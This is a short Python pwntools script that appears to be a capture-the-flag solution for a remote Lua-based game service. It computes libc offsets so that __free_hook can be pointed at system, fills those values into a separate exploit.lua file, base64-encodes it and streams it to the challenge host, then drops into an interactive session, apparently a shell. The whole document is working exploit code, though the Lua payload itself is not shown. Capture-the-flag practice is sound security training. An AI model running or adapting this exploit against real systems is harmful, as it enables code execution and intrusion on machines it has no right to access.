#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *
from base64 import b64encode

# context.log_level = "DEBUG"

if __name__ == "__main__":
    libc = ELF("libc-2.27.so")

    system_offset = libc.symbols["printf"] - libc.symbols["system"]
    free_hook_offset = libc.symbols["__free_hook"] - libc.symbols["system"]

    with open("exploit.lua", "rb") as f:
        script = f.read()

    script = script \
        .replace(b"$SYSTEM_OFFSET$", bytes(hex(system_offset), "ascii")) \
        .replace(b"$FREE_HOOK_OFFSET$", bytes(hex(free_hook_offset), "ascii"))

    conn = remote("peerreview.sstf.site", 37714)
    # conn = process(["luqwest", "script.lua"])
    log.info("Connected")

    conn.recvuntil("» ")
    conn.sendline("L")
    conn.recvuntil(":")

    payload = b64encode(script)
    payload = [b"-----BEGIN GAME-----"] + \
              [payload[i:i + 76] for i in range(0, len(payload), 76)] + \
              [b"-----END GAME-----"]

    for x in payload:
        print(x.decode("ascii"))

        conn.recvuntil("» ")
        conn.sendline(x)

    log.info("Payload sent")

    conn.interactive()
